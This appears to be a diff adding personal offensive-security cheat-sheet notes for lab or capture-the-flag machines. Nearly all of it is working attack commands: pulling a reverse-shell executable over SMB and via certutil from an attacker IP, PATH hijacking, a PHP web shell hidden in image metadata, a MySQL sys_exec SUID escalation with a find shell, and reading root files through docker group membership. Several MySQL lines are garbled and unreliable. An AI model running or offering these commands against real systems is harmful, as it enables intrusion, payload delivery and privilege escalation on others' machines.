@@ -1,0 +1,57 @@
+================================rdp_command==============================================================
+
+
+xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.45.210
+
+========================#sending a file over smb========================================================================
+
+
+sending machine:
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
+
+recieving machine:
+copy \\10.9.80.151\kali\reverse.exe C:\Privesc\autorun.exe
+
+======================================================recieving a file from CMD=============================================
+
+cmd.exe /C certutil -urlcache -split -f http://10.9.80.151/kail/program.exe prog.exe
+
+======================================================================================================================
+path variable attack
+-----------------------
+
+$ echo $PATH
+$ export PATH=/tmp:$PATH
+===========================================
+steganography 
+-------------
+exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' payload.png
+
+===============================================================
+new tips
+---------
+
+
+mysql> mysql -u root -p
+mysql> SELECT sys_exec('chmod u+s /usr/bin/find');
+mysql> echo os.system('/bin/bash')
+mysql> quit
+
+
+Once we change the permissions then we utilise that to our advantage and gain privileged access.
+
+$ cd /tmp
+$ touch temp_file
+$ find temp_file -exec "/bin/sh" \;
+
+
+
+$ getcap -r / 2>/dev/null
+
+We run the following command to see the binaries we can execute and use those to modify the files or folders with higher privilege and get access to the content inside of them. One way is to compress a high privileged file to a directory the user has access to and then extract it out there, the privilege of the file will now fall and can be read by a normal user as well, thus escalating our 
+privilege.
+
+
+So anyone who is a part of the docker group, in turn has access to everything that a root user has access to.
+
+$ docker run -v /root:/hack -t debian:jessie /bin/sh -c 'cat /root/root.txt'
